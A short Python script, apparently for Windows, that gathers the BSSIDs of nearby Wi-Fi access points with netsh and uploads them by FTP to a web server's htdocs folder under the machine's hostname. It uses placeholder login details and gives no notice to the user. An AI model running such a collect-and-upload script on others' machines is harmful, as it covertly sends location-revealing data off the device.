import os, time, socket 
from ftplib import FTP
# netsh wlan show all  | find "BSSID" - find  BSSID only of near AP
# netsh wlan show interfaces | find "BSSID" - find BSSID only connected AP
netsh = os.popen('netsh wlan show all  | find "BSSID"')
computernam=socket.gethostname()
f = open( computernam, 'w')
f.write("""BSSID of near AP 
""")
netsh = os.popen('netsh wlan show all  | find "BSSID"')
for id in netsh.readlines():
    f.write(id)
f.close()
ftp = FTP('ftpname')
ftp.login(user="user",passwd="password")
ftp.cwd(dirname="htdocs")
path=computernam
with open(path, 'rb') as fobj:
    ftp.storbinary('STOR ' + path, fobj, 1024)
